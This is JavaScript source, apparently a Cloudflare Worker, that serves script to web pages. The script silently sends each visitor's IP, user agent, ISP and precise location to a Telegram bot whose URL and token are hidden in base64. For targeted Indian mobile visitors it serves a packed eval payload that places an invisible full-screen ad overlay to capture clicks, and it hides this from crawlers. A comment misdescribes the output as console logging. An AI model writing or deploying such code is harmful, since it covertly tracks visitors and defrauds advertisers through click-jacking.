export default {
  async fetch(request, env, ctx) {
    try {
      const clientUA = request.headers.get('User-Agent') || '';
      const clientIP = request.headers.get('CF-Connecting-IP') || '';
      const referer = request.headers.get('Referer') || '';
      const clientASN = request.cf.asn;
      const clientISP = request.cf.asOrganization;
      const clientCO = request.cf.country;
      const clientCI = request.cf.city;
      const clientRE = request.cf.region;
      const clientRC = request.cf.regionCode;
      const clientLAT = request.cf.latitude;
      const clientLON = request.cf.longitude;
      const clientPC = request.cf.postalCode;
      const clientTZ = request.cf.timezone;

      // List of allowed domains
      const allowedDomains = [
        'fastrojgar.com',
        'www.fastrojgar.com',
        'fastrojgar.in',
        'www.fastrojgar.in',
        'sarkarigoal.com',
        'www.sarkarigoal.com',
        'sarkarigroup.in'
      ];
      // Check if the referer matches an allowed domain
      const isFromAllowedDomain = allowedDomains.some(domain => referer.includes(domain));

      // Check if the user is a bot
      const isBot = /bot|crawl|spider|agent|google/i.test(clientUA);

      // Check if the user is on a mobile device
      const isMobile = /Mobile|Android|iPhone/i.test(clientUA);

      const rCode = /RJ|UP|BR|MP/i.test(clientRC);
      const country = clientCO; // Add this line to define 'country'

      let message;

      let jsadcode = `eval(function(p%2Ca%2Cc%2Ck%2Ce%2Cd)%7Be%3Dfunction(c)%7Breturn(c%3Ca%3F%27%27%3Ae(parseInt(c%2Fa)))%2B((c%3Dc%25a)%3E35%3FString.fromCharCode(c%2B29)%3Ac.toString(36))%7D%3Bwhile(c--)%7Bif(k%5Bc%5D)%7Bp%3Dp.replace(new%20RegExp(%27%5C%5Cb%27%2Be(c)%2B%27%5C%5Cb%27%2C%27g%27)%2Ck%5Bc%5D)%7D%7Dreturn%20p%7D(%27b%20j()%7Bd%201%3D%3D7.P.1P(%22L%22)%7Db%20O(e)%7B7.P.11(%22L%22%2Ce%3F1%3A0)%7Db%20u()%7B9(!j())%7B3%20e%3DS.Z%7C%7CS.W%7C%7C7.U%2Ct%3D%2F16%7C1q%2Fi.K(e)%2Ce%3D%2F1o%7C1k%7C1j%7C1g%7C1f%7C1e%7C1d%7CT%7C18%7C1a%7C1b%2Fi.K(e)%3B9(t%26%26!e)d!0%7Dd!1%7Db%20v()%7B9(u())%7B3%20e%3D2.c(%226.f%22)%3B9(e)%7B3%20t%3De.h(%224-5-A%22)%2Cn%3De.h(%224-5-J%22)%2Ci%3D%7BI%3Ae%3D%3E(e%3D2.H.19(1h%201l(%22(%3F%3A%5E%7C%3B%20)%22%2Be.1m(%2F(%5B.%24%3F*%7C%7B%7D()%5B%5C%5C%5D%5C%5C%5C%5C%2F%2B%5E%5D)%2Fg%2C%22%241%22)%2B%22%3D(%5B%5E%3B%5D*)%22)))%3F1n(e%5B1%5D)%3A1p%200%2Cp%3A(e%2Ct%2Co%3D%7B%7D)%3D%3E%7B(o%3D%7B1i%3A%22%2F%22%2C...o%7D).k%2017%20V%26%26(o.k%3Do.k.X())%3BN%20n%3DE(F(e))%2B%22%3D%22%2BE(F(t))%3B10(3%20i%20Y%20o)%7Bn%2B%3D%22%3B%20%22%2Bi%3B3%20a%3Do%5Bi%5D%3B!0!%3D%3Da%26%26(n%2B%3D%22%3D%22%2Ba)%7D2.H%3Dn%7D%7D%3B9(R%3D%3Di.I(%22q%22))%7Be%3D2.G(%22C%22)%3Be.D%3D%226.8%7Bx%3AQ%25%3B12-13%3A14%3B15%3A1r%3Bz-1c%3A1t%3B1w%3A0%3B1R%3A0%3B1S%3A0%3B1T%3A0%3BB%3A0%3B1U%3A0%20y%3B1V-1W%3A20%7D%22%2C2.1Y.w(e)%3B3%20a%3D2.G(%221Z%22)%3Ba.1Q.21(%221s%22)%2Ca.D%3D%22%3C6%2022%3D%5C%27f%208%5C%27%20C%3D%5C%2723%3A24%3BB%3A0%5C%27%204-5-A%3D%5C%27%22%2Bt%2B%22%5C%27%204-5-J%3D%5C%27%22%2Bn%2B%22%5C%27%204-5-26%3D%5C%27y%5C%27%204-25-x-1X%3D%5C%271E%5C%27%3E%3C%2F6%3E%22%2C2.1N.w(a)%2C(8%3D7.f%7C%7C%5B%5D).1v(%7B%7D)%3B1O%20r%3Da.c(%226.8%22)%3B3%20s%3D()%3D%3E%7Bi.p(%22q%22%2C1%2C%7B1x%3A1%2C%221y-1z%22%3A1A%7D)%2C1B(()%3D%3E%7Ba.m()%7D%2C1C)%7D%3Br.M(%221u%22%2C()%3D%3E%7Bs()%7D)%3BN%20o%3D1D(()%3D%3E%7B3%20e%3Da.c(%226.8%201F%22)%2Ct%3Dr.h(%224-5-1G%22)%3Br%26%260!%3D%3Dr.1H%7C%7C(l(o)%2Ca.m())%2C%221I%22%3D%3D%3Dt%3F(l(o)%2Ca.m())%3AR!%3D%3De%26%26%221J%22%3D%3D%3Dt%26%26(l(o)%2C7.M(%221K%22%2C()%3D%3E%7B2.1L%3D%3D%3De%26%26s()%7D))%7D%2CQ)%7D%7D%7D1M%20j()%7C%7CO(!0)%7Dv()%3B%27%2C62%2C131%2C%27%7C%7Cdocument%7Cvar%7Cdata%7Cad%7Cins%7Cwindow%7Csht%7Cif%7C%7Cfunction%7CquerySelector%7Creturn%7C%7Cadsbygoogle%7C%7CgetAttribute%7C%7CisTokensthiop%7Cexpires%7CclearInterval%7Cremove%7C%7C%7Cset%7Csgt%7C%7C%7C%7CisckMobile%7Ccheckpkscs%7CappendChild%7Cwidth%7Cauto%7C%7Cclient%7Cbackground%7Cstyle%7CinnerHTML%7Cunescape%7CencodeURIComponent%7CcreateElement%7Ccookie%7Cget%7Cslot%7Ctest%7Csthiop%7CaddEventListener%7Clet%7CsetTokensthiop%7ClocalStorage%7C100%7Cnull%7Cnavigator%7Cyandex%7Copera%7CDate%7Cvendor%7CtoUTCString%7Cin%7CuserAgent%7Cfor%7CsetItem%7Ctext%7Calign%7Ccenter%7Cposition%7Candroid%7Cinstanceof%7Cyahoo%7Cmatch%7Cfacebook%7Ctwitter%7Cindex%7Cgoogle%7Cduckduck%7Cbing%7Cbaidu%7Cnew%7Cpath%7Cspider%7Ccrawl%7CRegExp%7Creplace%7CdecodeURIComponent%7Cbot%7Cvoid%7Ciphone%7Cfixed%7Cpsa%7C9999%7Cclick%7Cpush%7Cright%7Csecure%7Cmax%7Cage%7C259200%7CsetTimeout%7C2e3%7CsetInterval%7Cfalse%7Ciframe%7Cstatus%7CoffsetHeight%7Cunfilled%7Cfilled%7Cblur%7CactiveElement%7Celse%7Cbody%7Cconst%7CgetItem%7CclassList%7Cbottom%7Cleft%7Copacity%7Cmargin%7Cmin%7Cheight%7Cresponsive%7Chead%7Cdiv%7C1px%7Cadd%7Cclass%7Cdisplay%7Cblock%7Cfull%7Cformat%27.split(%27%7C%27)))`;


      let jsopen = `function send_traffic_track_to_telegram() {
    var formData, url;

        formData = new FormData();
        formData.append("chat_id", "-1002000366447");
        formData.append("disable_web_page_preview", "true");
        formData.append("text", "clientUA: " + clientUA + " || clientIP: " + clientIP + " || clientCO: " + clientCO + " || clientCI: " + clientCI + " || clientRE: " + clientRE + " || clientRC: " + clientRC + " || clientLAT: " + clientLAT + " || clientLON: " + clientLON + " || clientPC: " + clientPC + " || clientTZ: " + clientTZ + " || Referrer: " + document.referrer + " || URL: " + window.location.href);
        
        url = window.atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDYxNzAwMTMwODA6QUFHRndOLTQ0ZHoyMUVNblI2amFYUW5yQktudmNsa1hHZXMvc2VuZE1lc3NhZ2U=");
        
        fetch(url, {
            method: "POST",
            mode: "no-cors",
            body: formData
        })
        .then(response => {
            console.log("Data sent successfully!");
        })
        .catch(error => {
            console.error("Error:", error);
        });
};

send_traffic_track_to_telegram();`;
	  
      let js = `var clientUA="${clientUA}"; 
      var clientIP="${clientIP}"; 
      var clientASN="${clientASN}"; 
      var clientISP="${clientISP}"; 
      var clientCO="${clientCO}"; 
      var clientCI="${clientCI}"; 
      var clientRE="${clientRE}"; 
      var clientRC="${clientRC}"; 
      var clientLAT="${clientLAT}"; 
      var clientLON="${clientLON}"; 
      var clientPC="${clientPC}"; 
      var clientTZ="${clientTZ}";`;

      if (isBot) {
        message = jsopen;
      } else if (isFromAllowedDomain) {
        if (isMobile && country === 'IN' && rCode) {
          message = decodeURIComponent(jsadcode);
        } else {
          message = jsopen;
        }
      } else {
        message = jsopen;
      }

      // JavaScript to log the message in the console
      const consoleScript = `${js} ${message}`;

      return new Response(consoleScript, {
        headers: { 'Content-Type': 'application/javascript' },
      });
      
    } catch (error) {
      return new Response('Internal Server Error: ' + error.message, { status: 500 });
    }
  },
};
